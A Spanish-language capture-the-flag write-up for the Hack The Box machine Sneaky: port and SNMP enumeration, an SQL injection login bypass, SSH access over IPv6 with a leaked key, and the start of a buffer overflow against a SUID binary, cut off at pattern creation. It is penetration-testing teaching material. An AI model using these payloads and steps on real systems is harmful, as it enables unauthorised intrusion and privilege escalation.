---
title: Sneaky WriteUp
date: 2024-03-18
categories: [WriteUps, Máquinas Linux]
tags: [SNMP, IPv6, Buffer Overflow]
image:
  path: ../../assets/img/writeups/Sneaky/sneaky.png
  width: 528
  height: 340
  alt: Banner Sneaky
---

Máquina entretenida, escaneamos por TCP y UDP, analizamos servicio SNMP y además usamos IPv6 para hackear la máquina objetivo. Una vez dentro explotamos un buffer overflow de un binario de root con privilegios SUID.

## Reconocimiento

¡Hola a todas y todos!, hoy estaré hackeando la máchina **Sneaky**, con IP **10.10.10.20**, una IP redonda. Me conecto a la VPN -la tienes que descargar de la plataforma- para estar en la misma red que la máquina objetivo:

```sh
> openvpn lab_TUNOMBRE.ovpn
```

Una vez que te hayas conectado -una buena línea de output a tener en cuenta para confirmarlo es; "Initialization Sequence Completed"- compruebo si tengo conectividad con la máquina Sneaky:

```sh
❯ ping -c 1 10.10.10.20
PING 10.10.10.20 (10.10.10.20) 56(84) bytes of data.
64 bytes from 10.10.10.20: icmp_seq=1 ttl=63 time=44.9 ms

--- 10.10.10.20 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 44.864/44.864/44.864/0.000 ms
```

El **ttl** igual a 63 indicaría que es una máquina Linux. Si el **ttl está próximo a 64 es Linux**, si está **próximo a 128 es Windows**.  
Tenemos conectividad, 1 paquete transmitido, 1 paquete recibido.

Es turno de realizar un escaner de puertos con nmap. Los puertos se abren para ejecutar servicios que son la entrada de los atacantes.

```sh
❯ nmap 10.10.10.20 -p- --open --min-rate 5000 -n -Pn -vvv -oN ports
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-18 09:49 CET
Initiating SYN Stealth Scan at 09:49
Scanning 10.10.10.20 [65535 ports]
Discovered open port 80/tcp on 10.10.10.20
Completed SYN Stealth Scan at 09:49, 11.73s elapsed (65535 total ports)
Nmap scan report for 10.10.10.20
Host is up, received user-set (0.044s latency).
Scanned at 2024-03-18 09:49:30 CET for 11s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.80 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)
```

Esto significan las opciones:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* -oN ports : Exportará el output a un fichero tipo nmap que llamaremos "ports"


Parece que solo tenemos el puerto **80** por conexión TCP. Si lo escaneamos un poco más para averiguar la versión (**-sV**) y lanzamos algunos scripts más (**-sC**):

```sh
❯ nmap 10.10.10.20 -p80 -sC -sV -oN serviceTCP
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-18 09:56 CET
Nmap scan report for 10.10.10.20
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Under Development!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.60 seconds
```

Mmmm parece que está en desarrollo según señala el título. Voy a echar un vistazo desde el navegador:

![Web]({{ 'assets/img/writeups/Sneaky/web.png' | relative_url }}){: .center-image }

Haré un fuzzing de subdirectorios sencillo con nmap:

```sh
❯ nmap 10.10.10.20 --script http-enum -p80 -oN webfuzz
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-18 16:42 CET
Nmap scan report for 10.10.10.20
Host is up (0.040s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /dev/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 3.95 seconds
```

Parece que tenemos un carpeta **/dev/** por ahí. Entramos y nos encontramos con un panel login.  
No sabemos ninguna credencial por el momento. Si abrimos la página fuente no encontramos nada de valor, probando credenciales típicas tampoco.

Intentemos un **SQLi**. Al poner un comilla simple en el campo user -izquierda- recibimos un mensaje distinto "Internal Serever Error: ". Probaremos la típica de `' or 1=1-- -` en ambos campos.

![SQLi]({{ 'assets/img/writeups/Sneaky/sqli.png' | relative_url }}){: .center-image }

Y funciona oye!. Muestra por abajo lo que obtenemos.

![Panel]({{ 'assets/img/writeups/Sneaky/panel.png' | relative_url }}){: .center-image }

Tenemos nombres de usuarios; **admin** y **thrasivoulos** y ese mensaje de "My Key". Si pincho consigo lo que parece una clave id_rsa. Voy a guardarla y darle el permiso 600.

```sh
❯ curl -s -X GET http://10.10.10.20/dev/sshkeyforadministratordifficulttimes > id_rsa  
# Descargada de la url donde estaba la clave.

❯ chmod 600 id_rsa
```
El problema es que no tenemos ningún servicio ssh abierto para conectarnos con esa clave -lo vimos en el escaner de puertos-:

```sh
❯ ssh -i id_rsa admin@10.10.10.20
ssh: connect to host 10.10.10.20 port 22: Connection refused
❯ ssh -i id_rsa thrasivoulos@10.10.10.20
ssh: connect to host 10.10.10.20 port 22: Connection refused
```
Tendremos que mirar por UDP si hay algún puerto abierto que podamos usar, para ello vamos a lanzar un escaner de puertos pero esta vez por **UDP**:

```sh
❯ nmap 10.10.10.20 -F -sU -oN portsUDP
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-18 10:01 CET
Nmap scan report for 10.10.10.20
Host is up (0.044s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 95.91 seconds
```

Y bien, tenemos el puerto **161** abierto, con el servicio SNMP. Se usar para gestionar dispositivos de red, tareas de configuración y cambiar ajustes de forma remota. Podemos ver información valiosa realizando un footprinting de SNMP.

## Footprinting a SNMP

```sh
❯ nmap 10.10.10.20 -p161 -sU -sV -oN nmapSNMP
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-18 10:17 CET
Nmap scan report for 10.10.10.20
Host is up (0.044s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: Sneaky

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

No pongo **-sC** porque luego lanzaré otras herramientas más específicas para este servicio. Con este último escaneo no tenemos muy clara la versión, pero parece que la **community string** es **public**. Las cadenas de comunidad/**community strings** pueden verse como contraseñas que se utilizan para determinar si la información solicitada puede verse o no. Para averiguar la community string podemos usar la herramienta **onesixtyone**:

```sh
❯ onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt 10.10.10.20
Scanning 1 hosts, 3220 communities
10.10.10.20 [public] Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686
10.10.10.20 [public] Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686
```

Confirmamos que la community string es **public**. Además parece que la máquina objetivo es **de 32 bits** (**i686**), curioso, no suelen serlo. A veces cuando es de 32 bits podemos pensar que hay un ataque buffer overflow disponible.

Con la herramienta **snmpwalk** podemos recoger los OIDs (Object Identifier) -suele empezar por 1.3.6 o lo que es lo mismo iso.3.6-. Estos identificadores están asociados con objetos que representan procesos en el sistema o dispositivos de red. Para lanzar la herramienta tenemos que saber la community string (public) y la versión, hay tres posibles; 1, 2c y 3.

```sh
❯ snmpwalk -v2c -c public 10.10.10.20
iso.3.6.1.2.1.1.1.0 = STRING: "Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (2524409) 7:00:44.09
iso.3.6.1.2.1.1.4.0 = STRING: "root"
iso.3.6.1.2.1.1.5.0 = STRING: "Sneaky"
iso.3.6.1.2.1.1.6.0 = STRING: "Unknown"
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "The MIB module for managing TCP implementations"
... SNIP ...
```

Salía muchísima info. Tuve que parar. No parecía que saliera nada más relevante, aunque quien sabe.. Lo de root y Sneaky podrían ser unas credenciales, lo que no se de qué, el servicio ssh parece que no está abierto.
Voy a probar otra herramienta, **braa**, que puede enumerar más información detrás de los OIDs.

```sh
❯ braa public@10.10.10.20:.1.3.6.\*
10.10.10.20:43ms:.0:Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686
10.10.10.20:41ms:.0:.10
10.10.10.20:41ms:.0:2574827
10.10.10.20:41ms:.0:root
10.10.10.20:41ms:.0:Sneaky
10.10.10.20:41ms:.0:Unknown
10.10.10.20:41ms:.0:0
... SNIP ...
10.10.10.20:41ms:.8:.1
10.10.10.20:41ms:.9:.3
10.10.10.20:41ms:.10:.92
10.10.10.20:41ms:.1:The MIB for Message Processing and Dispatching.
10.10.10.20:40ms:.2:The management information definitions for the SNMP User-based Security Model.
... SNIP ....
```

Podríamos intentar conectarnos por IPv6, podemos sacar la dirección IPv6 a través del servicio SNMP con la herramienta **enyx.py**, por [aquí](https://github.com/trickster0/Enyx) dejo el repo de github donde se encuentra. Para instalar:

```sh
❯ git clone https://github.com/trickster0/Enyx
Clonando en 'Enyx'...
remote: Enumerating objects: 92, done.
remote: Counting objects: 100% (19/19), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 92 (delta 5), reused 14 (delta 4), pack-reused 73
Recibiendo objetos: 100% (92/92), 1.36 MiB | 5.29 MiB/s, listo.
Resolviendo deltas: 100% (30/30), listo.
❯ ls
 Enyx
❯ cd Enyx
❯ ls
 enyx.png   enyx.py   Enyx_v3.py   README.md
❯ python3 enyx.py
  File "/home/guise/HTB/Machines/Linux/Sneaky/scripts/Enyx/enyx.py", line 6
    print '''###################################################################################
          ^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print('''##... SNIP ...
```
Da ese error porque es un script de python2. Me lo instalo, no lo tenía. Tampoco en el repositorio. Dejo ya de paso como hacerlo:

### Inciso; Instalando python2, un paquete externo.

Me descargo el paquete de la página oficial; [página](https://www.python.org/downloads/release/python-272/), el primer enlace por ejemplo.

```sh
> tar -zxvf Python-2.7.2.tgz
> cd Python-2.7.2.tgz
> make  # tardará y cargará mucahs cosas, no asustarse.
> sudo make install

# Mi versión por defecto de python sigue siendo la 3!
❯ python --version
Python 3.9.2

# Y ya puedo lanzar python2:
❯ python2.7 enyx.py
###################################################################################
#                                                                                 #
#                      #######     ##      #  #    #  #    #                      #
#                      #          #  #    #    #  #    #  #                       #
#                      ######    #   #   #      ##      ##                        #
#                      #        #    # #        ##     #  #                       #
#                      ######  #     ##         ##    #    #                      #
#                                                                                 #
#                           SNMP IPv6 Enumerator Tool                             #
#                                                                                 #
#                   Author: Thanasis Tserpelis aka Trickster0                     #
#                                                                                 #
###################################################################################


[+] Usage: enyx.py snmpversion communitystring IP
[+] snmpversion can be either 1 or 2c
```

## Seguimos..

Lanzamos ahora la herramienta **enyx.py**

```sh
❯ python2.7 enyx.py 2c public 10.10.10.20
###################################################################################
#                                                                                 #
#                      #######     ##      #  #    #  #    #                      #
#                      #          #  #    #    #  #    #  #                       #
#                      ######    #   #   #      ##      ##                        #
#                      #        #    # #        ##     #  #                       #
#                      ######  #     ##         ##    #    #                      #
#                                                                                 #
#                           SNMP IPv6 Enumerator Tool                             #
#                                                                                 #
#                   Author: Thanasis Tserpelis aka Trickster0                     #
#                                                                                 #
###################################################################################


[+] Snmpwalk found.
[+] Grabbing IPv6.
[+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:76e0
[+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb9:76e0
```
Con la **Unique-Local** podríamos conectarnos desde fuera. Porque con la de Link-Local no tenemos conectividad con las máquinas de HTB (por lo que sea), en cambio con la Unique si:

```sh
❯ ping6 -c 1 fe80:0000:0000:0000:0250:56ff:feb9:76e0
PING fe80:0000:0000:0000:0250:56ff:feb9:76e0(fe80::250:56ff:feb9:76e0) 56 data bytes
^C
--- fe80:0000:0000:0000:0250:56ff:feb9:76e0 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

❯ kill %
kill: no current job
❯ ping6 -c 1 dead:beef:0000:0000:0250:56ff:feb9:76e0
PING dead:beef:0000:0000:0250:56ff:feb9:76e0(dead:beef::250:56ff:feb9:76e0) 56 data bytes
64 bytes from dead:beef::250:56ff:feb9:76e0: icmp_seq=1 ttl=63 time=39.7 ms

--- dead:beef:0000:0000:0250:56ff:feb9:76e0 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 39.708/39.708/39.708/0.000 ms
```

Desde la herramienta **snmpwalk** mirando bien, podríamos haberla visto -**0xdf**, usuario HTB, lo averiguó así, entre otras formas-.  
**Hay bastantes más formas de llegar -mirar el post de la máquina Sneaky de 0xdf-**.

## Escaneamos por IPv6 y conectamos por ssh

Lo mismo que con una IPv4 podemos hacer con la IPv6, eso si, cambiamos un poco las opciones con el nmap:

```sh
❯ nmap -6 -p- --min-rate 10000 -oA nmap6-alltcp dead:beef:0000:0000:0250:56ff:feb9:76e0
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-18 18:03 CET
Nmap scan report for dead:beef::250:56ff:feb9:76e0
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds
```

Y ahora lanzamos algunos script de nmap para esos puertos:

```sh
❯ nmap -6 -p 22,80 -sC -sV -oA nmap6tcpScripts dead:beef:0000:0000:0250:56ff:feb9:76e0
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-18 18:07 CET
Nmap scan report for dead:beef::250:56ff:feb9:76e0
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 5d5d2a9785a120e226e4135458d6a422 (DSA)
|   2048 a2000e990fd3edb019d46ba8b193d987 (RSA)
|   256 e329c4cb8798df996f369f3150e3b942 (ECDSA)
|_  256 e685a8f86267f70128a1aa00b560f221 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 005056b976e0
|_      manuf: VMware

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.24 seconds
```

Con la clave id_rsa que ya teníamos, nos intentamos conectar con los usuarios recogidos anteriormente:

```sh
❯ ssh -i id_rsa thrasivoulos@dead:beef:0000:0000:0250:56ff:feb9:76e0
The authenticity of host 'dead:beef::250:56ff:feb9:76e0 (dead:beef::250:56ff:feb9:76e0)' can't be established.
ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq/E2o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'dead:beef::250:56ff:feb9:76e0' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Mar 18 10:27:31 EET 2024

  System load: 0.0               Memory usage: 4%   Processes:       175
  Usage of /:  40.9% of 3.32GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077
thrasivoulos@Sneaky:~$ 
```

Y estamos dentro!!. Ha molado bastante la explotación.  
Conseguimos la primera flag:

```sh
hrasivoulos@Sneaky:~$ pwd
/home/thrasivoulos
thrasivoulos@Sneaky:~$ ls -la
total 32
drwxr-xr-x 4 thrasivoulos thrasivoulos 4096 Sep 14  2022 .
drwxr-xr-x 4 root         root         4096 Sep 14  2022 ..
lrwxrwxrwx 1 root         root            9 Sep 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 thrasivoulos thrasivoulos  220 May  3  2017 .bash_logout
-rw-r--r-- 1 thrasivoulos thrasivoulos 3637 May  3  2017 .bashrc
drwx------ 2 thrasivoulos thrasivoulos 4096 Sep 14  2022 .cache
-rw-r--r-- 1 thrasivoulos thrasivoulos  675 May  3  2017 .profile
drwx------ 2 thrasivoulos thrasivoulos 4096 Sep 14  2022 .ssh
-r--r--r-- 1 thrasivoulos thrasivoulos   33 Mar 18 10:28 user.txt
thrasivoulos@Sneaky:~$ cat user.txt
0852f27ae7d03eba730*********
```
He de comentar que con la MAC se puede calcular la IPv6 -la Link local que vimos- y en algunos casos conectarnos, en HTB no se puede pero podemos bypassearlo, hackeamos otra máquina de HTB -hay algunas fáciles que ya hemos hecho- y desde ahí si podríamos conectarnos.

## Empezamos la escalada

La segunda flag está en carpeta root, para acceder a ella hay que elevar privilegios.

> La Unique Local puede cambiar. Me volví a conectar el día siguiente y cambió. Ahora es; *dead:beef:0000:0000:0250:56ff:feb9:3bce*.

```sh
thrasivoulos@Sneaky:~$ whoami
thrasivoulos
thrasivoulos@Sneaky:~$ uname -a
Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686 athlon i686 GNU/Linux
# Podemos confirmar que estamos ante un sistema de 32 bits (i686). Podríamos pensar en un BoF

thrasivoulos@Sneaky:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.5 LTS
Release:	14.04
Codename:	trusty

thrasivoulos@Sneaky:~$ id
uid=1000(thrasivoulos) gid=1000(thrasivoulos) groups=1000(thrasivoulos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
# Estamos grupo adm podríamos ver los logs. Y en el grupo sudo si supieramos password de mi usuario podría hacer un "sudo su" y ya estaría pero no lo sé
thrasivoulos@Sneaky:~$ 
```

Buscaré programas con privilegio **SUID**.

```sh
thrasivoulos@Sneaky:~$ find / \-perm -4000 2>/dev/null
/bin/umount
/bin/su
/bin/mount
/bin/ping6
/bin/fusermount
/bin/ping
/usr/local/bin/chal
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/bin/at
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
```

Ese **/usr/local/bin/chal** es raro.

```sh
thrasivoulos@Sneaky:~$ chal
Segmentation fault (core dumped)
```

Uiui tiene pinta esto de Buffer Overflow. Vamos a probar.

```sh
thrasivoulos@Sneaky:~$ chal AAA
thrasivoulos@Sneaky:~$ python -c 'print "A"*1000'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
thrasivoulos@Sneaky:~$ chal $(python -c 'print "A"*1000')
Segmentation fault (core dumped)
thrasivoulos@Sneaky:~$ 
```

A partir de este punto todo lo que pongamos es lo mismo que en en el post de **Basic BoF Linux 32bits**.

Básicamente falla porque hemos escrito más de los caracteres permitidos por el programa. Cuando lo hacemos los registros se llenan, nuestro propósito es llegar al registro **EIP**.  
- EIP = Extended Instruction Pointer. Puntero de instrucción que apunta a la siguiente instrucción que el microprocesador debe ejecutar.  
Al sobreescribir el registro EIP puedes controlar que apunte a la instrución que quieras ejecutar.

Primero paso el programa a mi equipo, así puedo manejarlo mejor. En la máquina Sneaky:

```sh
thrasivoulos@Sneaky:~$ which chal | xargs base64 -w 0; echo
f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAIIMECDQAAABUEQAAAAAAADQAIAAJACgAHgAbAAYAAAA0AAAANIAECDSABAggAQAAIAEAAAUAAAAEAAAAAwAAAFQBAABUgQQIVIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIvAUAALwFAAAFAAAAABAAAAEAAAAIDwAACJ8ECAifBAgYAQAAHAEAAAYAAAAAEAAAAgAAABQPAAAUnwQIFJ8ECOgAAADoAAAABgAAAAQAAAAEAAAAaAEAAGiBBAhogQQIRAAAAEQAAAAEAAAABAAAAFDldGTgBAAA4IQECOCEBAgsAAAALAAAAAQAAAAEAAAAUeV0ZAAAAAAAAAAAAAAAAAAAAAAAAAAABwAAABAAAABS5XRkCA8AAAifBAgInwQI+AAAAPgAAAAEAAAAAQAAAC9saWIvbGQtbGludXguc28uMgAABAAAABAAAAABAAAAR05VAAAAAAACAAAABgAAABgAAAAEAAAAFAAAAAMAAABHTlUA/IrQb8+v4fvC26oaZSItaFsEexECAAAABAAAAAEAAAAFAAAAACAAIAAAAAAE... SNIP .....
# Lo copio
#Por comprobar la integridad de la data:
thrasivoulos@Sneaky:~$ md5sum /usr/local/bin/chal
829873da7efc928ad1fc9cc3b793a639  /usr/local/bin/chal
```

Y ahora en mi máquina (me paso a una bash mejor):

```sh
> bash
> sudo su
> echo "CADENA" > base64 -d > chal
# Compruebo con md5sum que se ha copiado bien, y si:
❯ md5sum chal
829873da7efc928ad1fc9cc3b793a639  chal
❯ file chal
chal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped
❯ chmod +x chal

❯ ./chal
zsh: segmentation fault  ./chal
```

Y parece que todo bien, se ha pasado bien, lo tenemos en local.  
Para analizar el programa usaré la herramienta **gdb** y dentro de ella la utilidad **gef**. Para instalarla [aquí](https://github.com/hugsy/gef).

```sh
❯ bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

## Explotación del BoF

```sh
❯ gdb ./chal
GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.00ms using Python engine 3.9
Reading symbols from ./chal...
(No debugging symbols found in ./chal)
gef➤  
```

Y nos sale por defecto el **gef** si no queremos que nos salga todo ese prompt mejor lanzar el gdb con la opción **-q** de quite.

```sh
❯ gdb ./chal -q
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.00ms using Python engine 3.9
Reading symbols from ./chal...
(No debugging symbols found in ./chal)
gef➤ 
```

Para mirar las protecciones del programa se usa **checksec**, en este caso no tiene ninguna:

```sh
gef➤  checksec
[+] checksec for '/home/guise/HTB/Machines/Linux/Sneaky/reco/chal'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

Para ejecutar el programa en gdb:

```sh
gef➤  r AA
Starting program: /home/guise/HTB/Machines/Linux/Sneaky/reco/chal AA
[Inferior 1 (process 87423) exited normally]
# r de run, para que ejecute el programa con el argumento AA.
gef➤  r AAAA
Starting program: /home/guise/HTB/Machines/Linux/Sneaky/reco/chal AAAA
[Inferior 1 (process 87616) exited normally]
# De momento funciona correctamente, como debería.
```

Pero si le lanzamos muchos caracteres pasa esto:

```sh
gef➤ r $(python -c 'print "A"*1000')
```

![gdb]({{ 'assets/img/Linux/CajonNoCierra/basicBofLinux32/gdb1.png' | relative_url }}){: .center-image }

Podemos ver por ejemplo que el registro EBP vale 0x41414141 que en hexadecimal es "AAAA". El registro **EIP** también se ha sobreescrito con esos valores -ya que todo que pusimos son "A"-. Como EIP debe tener la dirección de la próxima instrucción a ejecutar y esta dirección es "AAAA" esta dirección no existe y por eso falla y responde con "Segmentation Fault".

Para efectuar el Buffer Overflow tenemos que preguntarnos cuantas "A" o caracteres tenemos que poner hasta llegar a EIP. Si lo sé, justo después de ese número de caracteres hasta EIP puede meter la dirección que quiera en el EIP, para que el flujo del programa vaya por donde yo quiero.

Con gef podemos crear un patrón de caracteres para luego identificar mejor en que número llegamos a EIP:

```sh
gef➤  pattern create 1000
[+] Generating a pattern of 1000 bytes (n=4)
